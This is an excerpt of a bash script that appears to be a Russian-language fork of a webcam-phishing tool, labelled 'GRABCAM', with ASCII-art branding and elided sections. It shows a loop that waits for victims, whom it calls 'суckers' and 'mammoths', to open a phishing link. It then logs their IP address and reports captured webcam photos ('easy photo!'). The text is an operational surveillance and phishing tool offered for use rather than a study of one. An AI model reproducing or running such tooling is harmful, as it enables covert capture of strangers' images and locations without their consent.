...
echo '
                        ...
                        |  ((_))   ||     -_
                        |__________|/
             ___  ____   __   ____   ___   __   _  _         CHERVA_EDITION  INSTAGRAM:zloba_fs0ciety_
            / __)(  _ \ / _\ (  _ \ / __) / _\ ( \/ )
           ( (_ \ )   //    \ ) _ (( (__ /    \/ \/ \
...
printf "         \e[1;77m  v2.0 ukranian edition by cherva ebat   ^_^ chervanedayn\e[0m \n"
printf "         \e[1;77m это попытка сделать свой что-то билда итд крч не суди строго ок да?\e[0m \n"

printf "\n"

echo "      N073:> PLEASE TURN ON YOUR HOTSPOT 
                   OR ELSE YOU DONT GET LINK....!
                   крч ес нет ссылки то включи точку доступа
                   ок да???"
...
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Ждем лоха,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Мамонт открыл ссылку!\n"
catch_ip
rm -rf ip.txt
...
if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Изи фотка!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5
